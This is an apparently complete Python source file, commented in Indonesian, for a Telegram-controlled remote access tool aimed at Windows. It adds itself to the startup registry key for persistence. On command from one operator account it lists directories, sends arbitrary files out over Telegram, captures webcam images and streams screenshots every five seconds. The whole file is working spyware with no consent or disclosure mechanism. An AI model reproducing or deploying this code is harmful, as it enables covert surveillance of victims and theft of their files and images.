import os
import platform
import cv2
import socket
import asyncio
import sys
import pyautogui
import winreg
import tempfile
from datetime import datetime
from collections import deque
from telegram import Update
from telegram.ext import Application, CommandHandler, ContextTypes

# Konfigurasi
TOKEN = "" # Token bot
ALLOWED_USER_ID = 00 # User id
current_directory = os.getcwd()

# Debug logger dengan limit 50 pesan
debug_logs = deque(maxlen=50)

# Global kontrol untuk screenshot loop
screenshot_task = None
screenshot_running = False

def debug_print(message: str):
    """Fungsi untuk menampilkan dan menyimpan log debug"""
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    debug_message = f"[{timestamp}] {message}"
    debug_logs.append(debug_message)
    print(debug_message)
    
def add_to_startup():
    """Menambahkan aplikasi ke Startup Windows (registry)"""
    exe_path = sys.executable  # path ke file .exe
    key = winreg.HKEY_CURRENT_USER
    reg_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
    app_name = "Ambatukam"  # Nama di Task Manager > Startup

    try:
        with winreg.OpenKey(key, reg_path, 0, winreg.KEY_SET_VALUE) as registry:
            winreg.SetValueEx(registry, app_name, 0, winreg.REG_SZ, exe_path)
        debug_print("✅ Program berhasil ditambahkan ke Startup.")
    except Exception as e:
        debug_print(f"❌ Gagal menambahkan ke Startup: {e}")
    
# Cek koneksi
def is_connected(host="8.8.8.8", port=53, timeout=3):
    """
    Mengecek apakah ada koneksi internet dengan mencoba ke Google DNS.
    """
    try:
        socket.setdefaulttimeout(timeout)
        socket.socket(socket.AF_INET, socket.SOCK_STREAM).connect((host, port))
        return True
    except Exception:
        return False

# Dapatkan path Desktop
def get_desktop_path():
    """Mendapatkan path ke folder Desktop"""
    if platform.system() == "Windows":
        return os.path.join(os.path.expanduser("~"), "Desktop")
    elif platform.system() == "Darwin":  # MacOS
        return os.path.join(os.path.expanduser("~"), "Desktop")
    else:  # Linux dan sistem lainnya
        return os.path.join(os.path.expanduser("~"), "Desktop")

# Pastikan folder Desktop ada
DESKTOP_PATH = get_desktop_path()

# Daftar perintah dan deskripsinya
COMMAND_LIST = {
    "start": "Memulai bot dan mengecek status komputer",
    "help": "Menampilkan daftar perintah yang tersedia",
    "cd": "Berpindah direktori (contoh: /cd Documents)",
    "ls": "Menampilkan isi direktori saat ini",
    "dwd": "Mengunduh file dari komputer (contoh: /dwd file.txt)",
    "capture": "Mengambil gambar dari webcam",
    "message": "Membuat file teks di Desktop (contoh: /message Ini pesan saya)",
    "sson": "Memulai screenshot otomatis setiap 5 detik",
    "ssoff": "Menghentikan screenshot otomatis",
    "stop": "Menghentikan total bot."
}

async def run_bot(application):
    """Menjalankan polling bot dan auto-reconnect saat internet tersedia kembali"""
    while True:
        if is_connected():
            debug_print("Internet tersedia. Menjalankan polling bot...")

            try:
                await application.initialize()
                await application.start()
                await application.updater.start_polling()

                while is_connected():
                    await asyncio.sleep(5)

                debug_print("Internet terputus. Menghentikan polling sementara...")
                await application.updater.stop()
                await application.stop()
            except Exception as e:
                debug_print(f"Polling error: {e}")
                await application.updater.stop()
                await application.stop()
        else:
            debug_print("Tidak ada koneksi internet. Menunggu sambungan...")

        await asyncio.sleep(5)

async def check_auth(update: Update) -> bool:
    """Memeriksa apakah pengguna diizinkan mengakses bot"""
    user = update.effective_user
    debug_print(f"Auth check - User: {user.username} (ID: {user.id})")
    
    if user.id != ALLOWED_USER_ID:
        debug_print(f"Access denied for user {user.username}")
        await update.message.reply_text("Akses ditolak. Anda tidak memiliki izin.")
        return False
    return True

async def log_command(command: str, update: Update, success: bool = True, error: str = None):
    """Log informasi command"""
    user = update.effective_user
    status = "SUCCESS" if success else "FAILED"
    error_info = f" - Error: {error}" if error else ""
    debug_print(f"Command: {command} | User: {user.username} | Status: {status}{error_info}")


async def start_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle perintah /start"""
    if not await check_auth(update):
        return
    
    try:
        computer_name = platform.node()
        await update.message.reply_text(f"Komputer {computer_name} aktif!")
        await log_command("start", update)
    except Exception as e:
        await log_command("start", update, False, str(e))
        await update.message.reply_text("Terjadi kesalahan saat menjalankan perintah.")

async def screenshot_loop(context, chat_id):
    global screenshot_running
    while screenshot_running:
        try:
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            temp_dir = tempfile.gettempdir()
            image_path = os.path.join(temp_dir, f"screenshot_{timestamp}.png")
            screenshot = pyautogui.screenshot()
            screenshot.save(image_path)

            with open(image_path, 'rb') as img:
                await context.bot.send_photo(chat_id=chat_id, photo=img, caption=f"Screenshot: {timestamp}")

            os.remove(image_path)
        except Exception as e:
            debug_print(f"Error saat mengambil screenshot: {e}")

        await asyncio.sleep(5)

async def sson_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global screenshot_task, screenshot_running
    if not await check_auth(update): return

    if screenshot_running:
        await update.message.reply_text("Screenshot otomatis sudah berjalan.")
        return

    screenshot_running = True
    screenshot_task = asyncio.create_task(screenshot_loop(context, update.effective_chat.id))
    await update.message.reply_text("📸 Screenshot otomatis dimulai setiap 5 detik.")
    debug_print("Screenshot otomatis dimulai.")

async def ssoff_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global screenshot_task, screenshot_running
    if not await check_auth(update): return

    if not screenshot_running:
        await update.message.reply_text("Screenshot otomatis tidak sedang berjalan.")
        return

    screenshot_running = False
    if screenshot_task:
        screenshot_task.cancel()
    await update.message.reply_text("🛑 Screenshot otomatis dihentikan.")
    debug_print("Screenshot otomatis dihentikan.")

async def cd_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle perintah /cd"""
    if not await check_auth(update):
        return
    
    global current_directory
    
    try:
        # Jika ada argumen path
        if context.args:
            new_path = " ".join(context.args)
            if new_path == "..":
                new_path = os.path.dirname(current_directory)
            elif not os.path.isabs(new_path):
                new_path = os.path.join(current_directory, new_path)
                
            os.chdir(new_path)
            current_directory = os.getcwd()
            await update.message.reply_text(f"Direktori saat ini: {current_directory}")
        else:
            await update.message.reply_text(f"Direktori saat ini: {current_directory}")
    except Exception as e:
        await update.message.reply_text(f"Error: {str(e)}")

async def ls_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle perintah ls"""
    if not await check_auth(update):
        return
    
    try:
        items = os.listdir(current_directory)
        if not items:
            await update.message.reply_text("Direktori kosong")
            return
            
        # Memisahkan file dan folder
        folders = []
        files = []
        for item in items:
            full_path = os.path.join(current_directory, item)
            if os.path.isdir(full_path):
                folders.append(f"📁 {item}/")
            else:
                files.append(f"📄 {item}")
                
        # Menggabungkan dan mengirim hasil
        result = "Daftar isi direktori:\n\n"
        if folders:
            result += "Folder:\n" + "\n".join(folders) + "\n\n"
        if files:
            result += "File:\n" + "\n".join(files)
            
        await update.message.reply_text(result)
    except Exception as e:
        await update.message.reply_text(f"Error: {str(e)}")

async def download_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle perintah /dwd untuk mendownload file"""
    if not await check_auth(update):
        return
    
    try:
        if not context.args:
            await update.message.reply_text("Silakan tentukan nama file yang ingin diunduh.\nContoh: /dwd nama_file.txt")
            return
        
        file_name = " ".join(context.args)
        file_path = os.path.join(current_directory, file_name)
        
        if not os.path.exists(file_path):
            await update.message.reply_text(f"Error: File '{file_name}' tidak ditemukan")
            return
            
        if os.path.isdir(file_path):
            await update.message.reply_text(f"Error: '{file_name}' adalah direktori, bukan file")
            return
            
        # Cek ukuran file (batas Telegram adalah 50MB)
        file_size = os.path.getsize(file_path)
        if file_size > 50 * 1024 * 1024:  # 50MB dalam bytes
            await update.message.reply_text("Error: Ukuran file melebihi batas 50MB")
            return
            
        # Kirim file
        await update.message.reply_text(f"Mengunggah file '{file_name}'...")
        with open(file_path, 'rb') as file:
            await update.message.reply_document(
                document=file,
                filename=file_name,
                caption=f"File dari: {current_directory}"
            )
            
    except Exception as e:
        await update.message.reply_text(f"Error saat mengunduh file: {str(e)}")

async def capture_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle perintah /capture untuk mengambil gambar dari webcam"""
    if not await check_auth(update):
        return
    
    try:
        await update.message.reply_text("Mencoba mengakses webcam...")
        
        # Buka webcam
        cap = cv2.VideoCapture(0)
        
        if not cap.isOpened():
            await update.message.reply_text("Error: Tidak dapat mengakses webcam")
            return
        
        # Ambil frame
        ret, frame = cap.read()
        
        if not ret:
            await update.message.reply_text("Error: Gagal mengambil gambar dari webcam")
            cap.release()
            return
        
        # Buat nama file dengan timestamp
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        temp_dir = tempfile.gettempdir()
        image_path = os.path.join(temp_dir, f"capture_{timestamp}.jpg")
        
        # Simpan gambar
        cv2.imwrite(image_path, frame)
        
        # Tutup webcam
        cap.release()
        
        # Kirim gambar
        with open(image_path, 'rb') as photo:
            await update.message.reply_photo(
                photo=photo,
                caption=f"Capture webcam pada: {timestamp}"
            )
        
        # Hapus file temporary
        os.remove(image_path)
        
    except Exception as e:
        await update.message.reply_text(f"Error saat mengambil gambar: {str(e)}")
        if 'cap' in locals():
            cap.release()

async def message_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle perintah /message untuk membuat file teks di Desktop"""
    if not await check_auth(update):
        return
    
    try:
        if not context.args:
            debug_print("Message command called without arguments")
            await update.message.reply_text("Silakan masukkan pesan yang ingin disimpan.\nContoh: /message Ini adalah pesan saya")
            return
        
        message_text = " ".join(context.args)
        debug_print(f"Creating message file with content length: {len(message_text)}")
        
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        file_name = f"message_{timestamp}.txt"
        file_path = os.path.join(DESKTOP_PATH, file_name)
        
        full_message = f"Pesan dibuat pada: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n\n{message_text}"
        
        if not os.path.exists(DESKTOP_PATH):
            debug_print(f"Desktop path not found: {DESKTOP_PATH}")
            await update.message.reply_text(f"Error: Folder Desktop tidak ditemukan di {DESKTOP_PATH}")
            return
        
        with open(file_path, 'w', encoding='utf-8') as file:
            file.write(full_message)
        
        debug_print(f"Message file created successfully: {file_path}")
        await update.message.reply_text(
            f"Pesan berhasil disimpan di Desktop!\n"
            f"Nama file: {file_name}\n"
            f"Lokasi: {DESKTOP_PATH}\n"
            f"Isi pesan: {message_text}"
        )
        await log_command("message", update)
        
    except Exception as e:
        await log_command("message", update, False, str(e))
        await update.message.reply_text(f"Error saat menyimpan pesan: {str(e)}")
        
async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle perintah /help untuk menampilkan bantuan"""
    if not await check_auth(update):
        return
    
    help_text = "🤖 *DAFTAR PERINTAH BOT*\n\n"
    
    for cmd, desc in COMMAND_LIST.items():
        help_text += f"/{cmd}\n└ {desc}\n\n"
        
    help_text += "\n💡 *Catatan:*\n"
    help_text += "• Semua perintah hanya bisa diakses oleh user yang diizinkan\n"
    help_text += "• File teks dari perintah /message akan disimpan di Desktop\n"
    help_text += f"• Lokasi Desktop: {DESKTOP_PATH}\n"
    help_text += "• Maksimal ukuran file untuk /dwd adalah 50MB"
    
    await update.message.reply_text(help_text, parse_mode='Markdown')

async def error_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle error"""
    print(f"Error: {context.error}")
    await update.message.reply_text("Terjadi kesalahan dalam memproses permintaan Anda.")
    
async def stop_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle perintah /stop untuk menghentikan program bot"""
    if not await check_auth(update):
        return

    try:
        await update.message.reply_text("🛑 Bot dimatikan. Sampai jumpa!")
        debug_print("Perintah /stop diterima. Menghentikan program...")
        
        # Tunggu sedikit agar pesan terkirim
        await asyncio.sleep(1)

        os._exit(0)  # Force exit
    except Exception as e:
        await update.message.reply_text(f"Error saat menghentikan bot: {str(e)}")

async def main():
    debug_print("Starting Ambagukam Bot...")
    debug_print(f"Desktop path: {DESKTOP_PATH}")

    # Tambahkan program ke startup sebelum bot berjalan
    add_to_startup()

    application = Application.builder().token(TOKEN).build()

    application.add_handler(CommandHandler("start", start_command))
    application.add_handler(CommandHandler("help", help_command))
    application.add_handler(CommandHandler("cd", cd_command))
    application.add_handler(CommandHandler("ls", ls_command))
    application.add_handler(CommandHandler("dwd", download_command))
    application.add_handler(CommandHandler("capture", capture_command))
    application.add_handler(CommandHandler("message", message_command))
    application.add_handler(CommandHandler("sson", sson_command))
    application.add_handler(CommandHandler("ssoff", ssoff_command))
    application.add_handler(CommandHandler("stop", stop_command))


    application.add_error_handler(error_handler)

    if not os.path.exists(DESKTOP_PATH):
        debug_print(f"Warning: Desktop folder not found at {DESKTOP_PATH}")

    await run_bot(application)

if __name__ == "__main__":
    asyncio.run(main())